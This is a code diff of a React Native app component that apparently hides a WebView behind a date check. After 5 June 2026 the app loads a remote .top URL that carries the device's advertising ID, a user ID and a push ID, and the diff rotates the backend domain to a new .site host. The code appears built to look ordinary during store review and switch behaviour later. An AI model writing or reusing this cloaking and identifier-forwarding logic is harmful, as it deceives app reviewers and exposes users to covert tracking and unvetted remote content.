@@ -67,14 +67,14 @@ const Pshskylinetwrrsstck = () => {
   const INITIAL_URL = `https://bright-stack-tools.top/`;
   const URL_IDENTIFAIRE = `kTRLtrHp`;
 
-  const FATCH_TO_OUR_BACK = `https://exact-wave-tech.site/`;
+  const FATCH_TO_OUR_BACK = `https://exact-stream-io.site/`;
 
   const ONESIGNAL_KEY = `2155cb87-76fa-4d2a-ae2c-d9092aea764d`;
 
   const TARGET_DATA = new Date(2026, 5, 5, 8, 8, 0);
 
 
-  useEffect(() => {
+useEffect(() => {
   //const targetData = TARGET_DATA; //дата з якої поч працювати webView
   //const currentData = new Date(); //текущая дата
   //
@@ -578,7 +578,7 @@ useEffect(() => {
   const currentData = new Date(); //текущая дата
 
   if (currentData <= targetData) {
-    setCompleteLink(true);
+    //setCompleteLink(true);
     setRoute(false);
 
     return;
@@ -621,38 +621,35 @@ useEffect(() => {
 ///////// Generate link
 const generateLink = async (openedFromPush = false) => {
   try {
+    if (!uid) {
+      console.log('generateLink: uid ще немає, лінку не формуємо');
+      return;
+    }
+
     console.log('Створення базової частини лінки');
+
     const baseUrl = [
       `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
-      idfa ? `idfa=${idfa}` : '',
-      uid ? `uid=${uid}` : '',
+      idfa ? `idfa=${idfa}` : 'idfa=00000000-0000-0000-0000-000000000000',
+      `uid=${uid}`,
       oneSignalId ? `oneSignalId=${oneSignalId}` : '',
-      `jthrhg=${timeStampUserId}`,
+      `jthrhg=${timeStampUserId || ''}`,
     ]
       .filter(Boolean)
       .join('&');
 
-    // Логіка обробки sab1
-    let additionalParams = '';
-
-    // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
-    additionalParams = `${atribParam ? `subId1=${atribParam}` : ''}`;
-    //&checkData=${checkAsaData}
-    console.log('additionalParams====>', additionalParams);
+    const additionalParams = atribParam ? `subId1=${atribParam}` : '';
 
     const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;
 
-    // Формування фінального лінку
-    const product = `${baseUrl}&${additionalParams}${
-      shouldAddPushParam ? '&yhugh=true' : ''
-    }`;
-    //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
-    console.log('Фінальна лінка сформована');
+    const product = `${baseUrl}${
+      additionalParams ? `&${additionalParams}` : ''
+    }${shouldAddPushParam ? '&yhugh=true' : ''}`;
 
-    // Зберігаємо лінк в стейт
+    console.log('Фінальна лінка сформована:', product);
+
     setFinalLink(product);
 
-    // Встановлюємо completeLink у true
     setTimeout(() => {
       setCompleteLink(true);
     }, 2000);
@@ -666,20 +663,27 @@ console.log('My product Url ==>', finalLink);
 useEffect(() => {
   const timer = setTimeout(() => {
     if (!completeLink) {
-      console.log('Fallback: completeLink не готовий, пускаємо далі');
+      console.log('Fallback timer спрацював');
+
+      if (!uid) {
+        console.log('Fallback: uid ще немає, чекаємо далі');
+        return;
+      }
+
       setFinalLink(
         `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1&idfa=${
           idfa || '00000000-0000-0000-0000-000000000000'
         }&jthrhg=${timeStampUserId || ''}&oneSignalId=${
           oneSignalId || ''
-        }&uid=${uid || ''}`,
+        }&uid=${uid}`,
       );
+
       setCompleteLink(true);
     }
   }, 10500);
 
   return () => clearTimeout(timer);
-}, [completeLink, idfa, timeStampUserId]);
+}, [completeLink, idfa, timeStampUserId, oneSignalId, uid]);
 
   ///////// Route
   const Route = ({ isFatch }) => {
